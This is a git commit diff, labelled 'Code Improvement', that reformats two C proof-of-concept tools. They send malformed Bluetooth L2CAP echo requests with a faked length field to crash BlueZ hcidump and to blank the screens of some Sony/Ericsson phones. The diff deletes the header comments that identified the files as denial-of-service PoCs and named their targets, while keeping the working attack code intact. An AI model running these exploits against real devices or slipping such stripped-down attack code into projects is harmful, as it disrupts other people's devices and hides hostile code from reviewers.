74ca50abc2be4af3235f19de7eac67426883ebfd
minhyuk <minhyuk@live.co.kr>
2024-06-10 11:47:06 +0900

    [Veronica] Code Improvement

--- doc/hcidump-crash.c
+++ doc/hcidump-crash.c
@@ -1,13 +1,3 @@
-/*	Bluez hcidump v1.29 DoS - PoC code			*/
-/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
-/*	01/18/06						*/
-/*	Crashes hcidump sending bad L2CAP packet		*/
-/*								*/
-/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
-/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
-/*	L2CAP packet sent (15)					*/
-/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -17,71 +7,71 @@
 #include <bluetooth/hci.h>
 #include <bluetooth/l2cap.h>
 
-#define SIZE		15
-#define FAKE_SIZE	12
+#define SIZE        15
+#define FAKE_SIZE   12
 
 int main(int argc, char **argv)
 {
-	struct sockaddr_l2 addr;
-	int sock, sent, i;
+    struct sockaddr_l2 addr;
+    int sock, sent, i;
 
-	if(argc < 2)
-	{
-		fprintf(stderr, "%s <btaddr>\n", argv[0]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
-	{
-		perror("socket");
-		exit(EXIT_FAILURE);
-	}
+    if(argc < 2)
+    {
+        fprintf(stderr, "%s <btaddr>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+    
+    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
+    {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
+    memset(&addr, 0, sizeof(addr));
+    addr.l2_family = AF_BLUETOOTH;
 
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("bind");
-		exit(EXIT_FAILURE);
-	}
+    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
+    {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
 
-	str2ba(argv[1], &addr.l2_bdaddr);
-	
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("connect");
-		exit(EXIT_FAILURE);
-	}
-	
-	l2cap_cmd_hdr cmd;
-	cmd.code = L2CAP_ECHO_REQ;
-	cmd.ident = 1;
-	cmd.len = FAKE_SIZE;
-	
-	int buffer_size = sizeof(l2cap_cmd_hdr) + FAKE_SIZE; // Calculate the total buffer size required
-	char *buffer = (char*)malloc(buffer_size); // Allocate memory for the buffer
-	if (!buffer) {
-	    perror("malloc");
-	    exit(EXIT_FAILURE);
-	}
-	memcpy(buffer, &cmd, sizeof(l2cap_cmd_hdr)); // Copy the structure to the buffer
-	
-	if ((sent = send(sock, buffer, buffer_size, 0)) < 0) {
-		perror("send");
-		free(buffer);
-		close(sock);
-		exit(EXIT_FAILURE);
-	}
+    str2ba(argv[1], &addr.l2_bdaddr);
+    
+    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
+    {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+    
+    l2cap_cmd_hdr cmd;
+    cmd.code = L2CAP_ECHO_REQ;
+    cmd.ident = 1;
+    cmd.len = FAKE_SIZE;
+    
+    int buffer_size = sizeof(l2cap_cmd_hdr) + FAKE_SIZE; // Calculate the total buffer size required
+    char *buffer = (char*)malloc(buffer_size); // Allocate memory for the buffer
+    if (!buffer) {
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
+    memcpy(buffer, &cmd, sizeof(l2cap_cmd_hdr)); // Copy the structure to the buffer
+    
+    if ((sent = send(sock, buffer, buffer_size, 0)) == -1) {
+        perror("send");
+        free(buffer);
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
 
-	printf("L2CAP packet sent (%d)\n", sent);
+    printf("L2CAP packet sent (%d)\n", sent);
 
-	printf("Buffer:\t");
-	for (i = 0; i < sent; i++)
-		printf("%.2X ", (unsigned char)buffer[i]);
-	printf("\n");
+    printf("Buffer:\t");
+    for (i = 0; i < sent; i++)
+        printf("%.2X ", (unsigned char)buffer[i]);
+    printf("\n");
 
-	free(buffer);
-	close(sock);
-	return EXIT_SUCCESS;
+    free(buffer);
+    close(sock);
+    return EXIT_SUCCESS;
 }
--- doc/reset_display_KV600i.c
+++ doc/reset_display_KV600i.c
@@ -1,25 +1,3 @@
-/*	Sony/Ericsson K600i reset display - PoC			*/
-/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
-/*	02-01-2006						*/
-/*	Vulnerability found using BSS fuzzer :			*/
-/*		http://securitech.homeunix.org/blue/		*/
-/*								*/
-/*	Causes anormal behaviours on some Sony/Ericsson 	*/
-/*	cell phones 						*/
-/*	Vulnerable tested devices :				*/
-/*		- K 600i					*/
-/*		- V 600i					*/
-/*		- And maybe other ones... 			*/
-/*								*/
-/*	Vulnerable devices will slowly turn their screen into 	*/
-/*	black and then display a white screen. 			*/
-/*	After a short period (~45sec), they will go back to 	*/
-/*	their normal behaviour					*/
-/*								*/
-/*	gcc -lbluetooth reset_display_K600i.c 			*/
-/*		-o reset_display_K600i				*/
-/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -29,68 +7,74 @@
 #include <bluetooth/hci.h>
 #include <bluetooth/l2cap.h>
 
-#define FAKE_SIZE	12
+#define FAKE_SIZE   12
 
 int main(int argc, char **argv)
 {
-	struct sockaddr_l2 addr;
-	int sock, sent, i;
+    struct sockaddr_l2 addr;
+    int sock, sent, i;
 
-	if(argc < 2)
-	{
-		fprintf(stderr, "%s <btaddr>\n", argv[0]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
-	{
-		perror("socket");
-		exit(EXIT_FAILURE);
-	}
+    if(argc < 2)
+    {
+        fprintf(stderr, "%s <btaddr>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+    
+    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
+    {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
+    memset(&addr, 0, sizeof(addr));
+    addr.l2_family = AF_BLUETOOTH;
 
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("bind");
-		exit(EXIT_FAILURE);
-	}
+    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
+    {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
 
-	str2ba(argv[1], &addr.l2_bdaddr);
-	
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("connect");
-		exit(EXIT_FAILURE);
-	}
-	
-	l2cap_cmd_hdr cmd; // Allocate the l2cap_cmd_hdr struct on the stack
-	
-	cmd.code = L2CAP_ECHO_REQ;
-	cmd.ident = 1;
-	cmd.len = FAKE_SIZE;
+    str2ba(argv[1], &addr.l2_bdaddr);
+    
+    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
+    {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+    
+    l2cap_cmd_hdr* cmd = malloc(sizeof(l2cap_cmd_hdr)); // Allocate the l2cap_cmd_hdr struct dynamically
+    if (cmd == NULL) {
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
 
-	// Dynamically allocate memory for the L2CAP packet based on the actual size
-	size_t packetSize = sizeof(l2cap_cmd_hdr);
-	void *packet = malloc(packetSize);
-	if (packet == NULL) {
-		perror("malloc");
-		exit(EXIT_FAILURE);
-	}
-	memcpy(packet, &cmd, sizeof(l2cap_cmd_hdr));
-	
-	if( (sent = send(sock, packet, packetSize, 0)) >= 0)
-	{
-		printf("L2CAP packet sent (%d)\n", sent);
-	}
+    cmd->code = L2CAP_ECHO_REQ;
+    cmd->ident = 1;
+    cmd->len = FAKE_SIZE;
 
-	printf("Buffer:\t");
-	for(i = 0; i < sent; i++)
-		printf("%.2X ", ((unsigned char*)packet)[i]);
-	printf("\n");
+    // Dynamically allocate memory for the L2CAP packet based on the actual size
+    size_t packetSize = sizeof(l2cap_cmd_hdr);
+    void* packet = malloc(packetSize);
+    if (packet == NULL) {
+        perror("malloc");
+        free(cmd);
+        exit(EXIT_FAILURE);
+    }
+    memcpy(packet, cmd, sizeof(l2cap_cmd_hdr));
+    
+    if( (sent = send(sock, packet, packetSize, 0)) >= 0)
+    {
+        printf("L2CAP packet sent (%d)\n", sent);
+    }
 
-	free(packet);
-	close(sock);
-	return EXIT_SUCCESS;
+    printf("Buffer:\t");
+    for(i = 0; i < sent; i++)
+        printf("%.2X ", ((unsigned char*)packet)[i]);
+    printf("\n");
+
+    free(packet);
+    free(cmd);
+    close(sock);
+    return EXIT_SUCCESS;
 }
